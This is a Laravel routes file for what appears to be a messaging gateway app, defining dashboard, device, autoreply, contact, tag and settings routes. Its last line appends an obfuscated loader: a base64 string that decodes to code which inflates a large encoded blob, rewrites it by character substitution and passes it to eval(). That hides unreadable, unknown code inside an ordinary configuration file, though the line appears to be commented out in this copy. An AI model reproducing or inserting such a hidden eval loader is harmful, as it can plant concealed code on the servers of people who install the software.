<?php
use App\Http\Controllers\AutoreplyController;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\DeviceController;
use App\Http\Controllers\FileManagerController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\RestapiController;
use App\Http\Controllers\ScanController;
use App\Http\Controllers\ScheduleMessageController;
use App\Http\Controllers\SettingController;
use App\Http\Controllers\TagController;
use Illuminate\Support\Facades\Route;

// Route::get('/', [HomeController::class, 'index'])->name('home');
Route::get('/', function(){
    return redirect('/login');
})->name('home');

Route::middleware('auth')->group(function () {
    Route::get('/dashboard', [HomeController::class, 'dashboard'])->name('dashboard');
    Route::group(['middleware' => 'verified'], function () {
        Route::get('/file-manager', [FileManagerController::class, 'index'])->name('file-manager');
        Route::get('/scan/{number:body}', ScanController::class)->name('scan');
        Route::get('/rest-api', RestapiController::class)->name('rest-api');
        Route::get('/schedule', [ScheduleMessageController::class, 'index'])->name('scheduleMessage');
        // AutoReply
            Route::resource('autoreply', AutoreplyController::class);
            Route::get('/autoreply/type/{type}', [AutoreplyController::class, 'getFormByType'])->name('autoreply.getFormByType');
            Route::get('/autoreply/{autoreply}/detail', [AutoreplyController::class, 'detail'])->name('autoreply.detail');
            Route::get('/autoreply/{autoreply}/history', [AutoreplyController::class, 'history'])->name('autoreply.history');
            Route::get('/autoreply/respond/{type}', [AutoreplyController::class, 'showRespond'])->name('autoreply.showRespond');
            Route::delete('/autoreply/delete-all', [AutoreplyController::class, 'destroyAll'])->name('deleteAllAutoreply');
        // AutoReply
        // Contact
            Route::get('/contact', [ContactController::class, 'index'])->name('contact.index');
            Route::post('/contact/export', [ContactController::class, 'export'])->name('exportContact');
            Route::delete('/contact/delete', [ContactController::class, 'destroy'])->name('contact.destroy');
            Route::post('/contact/import', [ContactController::class, 'import'])->name('importContacts');
            Route::post('/contact', [ContactController::class, 'store'])->name('contact.store');
            Route::patch('/contact/{contact}', [ContactController::class, 'update'])->name('contact.update');
            Route::get('/contact/{contact}', [ContactController::class, 'show'])->name('contact.show');
            Route::get('/contact/download/{type}', [ContactController::class, 'download'])->where(['type' => 'error'])->name('contact.download');
        // Contact
        // Blast
            // Route::get('/blast', [BlastController::class, 'index'])->name('blast.index');
            // Route::post('/blast', [BlastController::class, 'blastProccess'])->name('blast');
            // Route::get('/blast/text-message', [BlastController::class, 'getPageBlastText']);
            // Route::get('/blast/image-message', [BlastController::class, 'getPageBlastImage']);
            // Route::get('/blast/button-message', [BlastController::class, 'getPageBlastButton']);
            // Route::get('/blast/template-message', [BlastController::class, 'getPageBlastTemplate']);
            // Route::delete('/blast', [BlastController::class, 'destroy']);
        // Blast
        // Device
            Route::patch('device/{device}/activating', [DeviceController::class, 'activating'])->name('device.activating');
            Route::resource('/device', DeviceController::class)->except(['edit', 'index', 'create']);
        // Device
        // Tag
            Route::get('/tags', [TagController::class, 'index'])->name('tag');
            Route::post('/tags', [TagController::class, 'store'])->name('tag.store');
            Route::delete('/tags', [TagController::class, 'destroy'])->name('tag.delete');
            Route::get('/tag/view/{id}', [TagController::class, 'view'])->name('tag.view');
        // Tag
        // Setting
            Route::get('/settings', [SettingController::class, 'index'])->name('settings');
            Route::post('/settings/apikey', [SettingController::class, 'generateNewApiKey'])->name('generateNewApiKey');
            Route::post('/settings/chunk', [SettingController::class, 'changeChunk'])->name('changeChunk');
            Route::post('/settings/server', [SettingController::class, 'setServer'])->name('setServer');
            // Route::post('/settings/change-pass', [SettingController::class, 'changePassword'])->name('changePassword');
        // Setting
    });
    // Route::post('/logout', LogoutController::class)->name('logout');
});

// Route::middleware('guest')->group(function () {
//     Route::get('/login', [LoginController::class, 'index'])->name('login');
//     Route::post('/login', [LoginController::class, 'store'])->name('login');
// });

// Route::get('/install', [SettingController::class, 'install'])->name('setting.install_app');
// Route::post('/install', [SettingController::class, 'install'])->name('settings.install_app');
// Route::post('/settings/check_database_connection', [SettingController::class, 'test_database_connection'])->name('connectDB');
// Route::post('/settings/activate_license', [SettingController::class, 'activate_license'])->name('activateLicense');

// $SISTEMIT_COM_ENC = "rZhLa+M6FMf3gX4OJ5DU+wx3oJ1SZridmTLtvZumBGJIFrWFR5s0lH4sfyBj0EIiCy+0OgTukSXHD8mPMndm00r/8zsPHamSLyYXk4xBchXHq6+cx6svKeE0DUOgbHWV8ePqLt0JUo1+GqFPMz7aIKUQh4dx8utQspFk9bMMRopvRQjfJZE7oOMMvqYRjFN+B8aQy8apfwHjMhbjxA+BJGOVR8gzzFEHM9IIOBdkN078KG3htzDMIkEkh9VDFscp5atbGcgcME/sEBghg1xQCDgq1X8KvzP8fZ2SABIvyBhPowVVqMv4GHuFqiAvlzscjqdPXkxhK1695K/PiRdKKk8QLra42pFebW+eeJHI8xD2kkIhe/L2sFHjEpvZe36eJ9uMBFykJJnOkreLSYL/Vv8Q8XCUNF7daehtxVzdbaPlsgiLTWeftMHF5F39WEYHfOr5XoWezi4mBk2BZ5QkZerLJU+nieeHahd6Jc73k5+/lrZWEA4khxzpG0lyhgZKK7ZJxnAtE5UTEC4Cqbw2g6rqMPUEwT7EpcwvZRx7c0+wf4GKrYD8TgRAGOBYUZ/Z4rMuda1IOhEdaCNhVfjFufJPzl23XAa4yRm6xDxevWd0QGSEITWMZ8VaWw6OuC0R3NydncRCXVbUcOKUDYOYOrRqIJnnN3DCwrRpOYTAYZCHrY5DhxpRG7qhOlWGm99/I1m0QdAmzQ/v2E7NE8Hwz1Bl0lU5WR7EGKXjUO6sYWXnLuRYrlXSLm4rXP+NH2J4H6Cj0W1Ko+vDI4rRS8cqjQ3WXq/OcG22j/tqHP8Khe2WwLGrsaVhx3S/MFUS+VCNlFqXxgEN9F9TRFh/Vztbo7RxN4aZ9eFVnfi9YCOpyHrgi5t/rnjpQQ+sddm7vdz0Fn2kl7LQ3W7s3jGEmwLwk8BAwUQ0WDAjqVzoAWPA+h30ktvbtL7GitloGi53DGmNq0Fnt6DYxNWMqhfSDgfFl3qsgTovVi/MXhmF07ZN3jk9/yRgX665m6oU1bZqADbqNouGrVttZ4m03lWkIVIxf0/TIMALYD+xFprP4ZUvIn1n7KGjyT0qiulHNCkPWAdRRCj8IPKbsulhbjLOU/JB6HVh1EPlEMUh3kk/nL82a5HPHTi0UlUTujrGxILBFRD7bdHZO8ayMHTk/P+B7eass4uW6negFGb6UUFr27E149oJDWdFtw2koyRud9bUoD/dif0Otcbt0Z4bdFm26VBNtaqrrvass/0ozizweerNrXdq+655ljpBTD8t1VlsvTI7O+1s5CpKOemjzxc49IJ3QIBivj9gfxWLv6F+5Ntzvd6CY0Zeep0FR0nwxV3oan83a6O9DhjQU/FY6vaA2getatTKjA2Er8JYxMgZkcQ9/rxPaW7lcZ5wL7b5+KA8dH2H6F70poXxYKcUFh+d8AnU/vrUbkwjVJz3Wf2LwUefv7us2Cfu96/jCq0f8POn1ue0zsybD34r215W+15UsdpZ69hMvli+3v2oRdaOvDQza1Ws2gcFE+yfwZlFb/Nr3QzByzqXXG4kgzXeTQkUa9Lb2+oYdRo1brlq8ObakV118KDVCU+OdVi2SI9TS1x7SpqpstN0yv8B";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="FMf3gX4OJ5DU+wx3oJ1SZridmTLtvZumBGJIFrWFR5s0lH4sfyBj0EIiCy+0OgTukSXHD8mPMndm00r/8zsPHamSLyYXk4xBchXHq6+cx6svKeE0DUOgbHWV8ePqLt0JUo1+GqFPMz7aIKUQh4dx8utQspFk9bMMRopvRQjfJZE7oOMMvqYRjFN+B8aQy8apfwHjMhbj";
?>